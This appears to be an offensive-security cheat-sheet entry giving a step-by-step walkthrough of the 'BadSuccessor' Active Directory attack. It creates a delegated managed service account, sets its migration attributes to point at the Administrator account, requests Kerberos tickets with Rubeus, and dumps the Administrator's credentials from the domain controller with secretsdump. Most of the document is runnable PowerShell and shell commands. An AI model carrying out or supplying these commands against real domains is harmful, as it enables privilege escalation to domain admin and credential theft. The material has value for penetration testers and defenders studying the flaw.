### Content

- [dMSA](#dmsa)

---

#### dMSA

During the migration process of the dMSA, the process doesn't require any permissions over the superseded account. The only requirement is write permissions over the attributes of a dMSA. **Any dMSA**.

Once we’ve marked a dMSA as preceded by a user, the KDC automatically assumes a legitimate migration took place and happily grants our dMSA every single permission that the original user had, as though we are its rightful successor.

Normally, when a dMSA is created using the `New-ADServiceAccount` cmdlet, it is stored in the `Managed Service Accounts` container. Only built-in privileged Active Directory groups have permissions over it by default.

dMSAs are not restricted to the Managed Service Accounts container; they can be created in any normal OU, as well. Any user that has either the Create `msDS-DelegatedManagedServiceAccount` or `Create all child objects` rights on any OU can create a dMSA.

Using [Get-BadSuccessorOUPermissions](https://github.com/akamai/BadSuccessor/tree/main) to identify which identities have permissions to create dMSAs in their domain, and which OUs are affected - highlighting where the BadSuccessor attack could be executed.

```PowerShell
PS C:\> .\Get-BadSuccessorOUPermissions.ps1

Identity    OUs
--------    ---
CORP\IT {OU=Staff,DC=corp,DC=local}
```

Suppose that our controlled user is a member in the `IT` OU.

Create a dMSA using the `New-ADServiceAccount` cmdlet:

```PowerShell
New-ADServiceAccount -name "rotten_dMSA" -DNSHostName "null.com" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "<ControlledUser>" -path "OU=Staff,DC=corp,DC=local"
```

Grant the controlled user permissions over the created dMSA object:

```PowerShell
import-module ActiveDirectory
$dn = "CN=rotten_dMSA,OU=Staff,DC=corp,DC=local"
$acl = Get-ACL "AD:$dn"
$acl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule([System.Security.Principal.NTAccount]"CORP\<controlledUser>","GenericAll","Allow")))
Set-ACL "AD:$dn" $acl
```

We are the owner of unfunctional dMSA, we can grant ourselves permission on the object, including write access on both the attributes we are going to use for this attack, which we can then modify in the following way:

- `msDS-ManagedAccountPrecededByLink`: Set this to any user or computer’s DN — Domain Controllers, members of Domain Admins, Protected Users, and (ironically) even accounts marked as "account is sensitive and cannot be delegated"
- `msDS-DelegatedMSAState`: Set this to 2 to simulate a completed migration

Now we can Edit the two attributes mentioned above to inherit the Administrator privileges.

```PowerShell
$dmsaa = [ADSI]"LDAP://CN=rotten_dmsa,OU=Staff,DC=corp,DC=local"
$dmsaa.Put("msDS-DelegatedMSAState", 2)
$dmsaa.Put("msDS-ManagedAccountPrecededByLink", "CN=ADMINISTRATOR,CN=USERS,DC=CORP,DC=LOCAL")
$dmsaa.SetInfo()
```

Get a TGT for your controlled user using Rubeus:

```PowerShell
PS C:\> .\Rubeus.exe asktgt /user:<controlledUser> /enctype:aes256 /password:<password> /domain:corp.local /nowrap
```

Using  TGT to request a TGT for `rotten_dMSA$`, save it in  `tgt.kirbi` and download it to the attacker host

```PowerShell
PS C:\> .\Rubeus.exe asktgs /targetuser:rotten_dMSA$  /service:krbtgt\CORP.LOCAL /dmsa /opsec /nowrap /ptt /outfile:tgt.kirbi /ticket:<controlledUser_TGT>
```

On the attacker machine:

```bash
$ ticketConverter.py tgt.kirbi tgt.ccache

$ export KRB5CCNAME=tgt.ccache
$ secretsdump.py @dc01.corp.local -k -no-pass -debug -just-dc-user Administrator
```

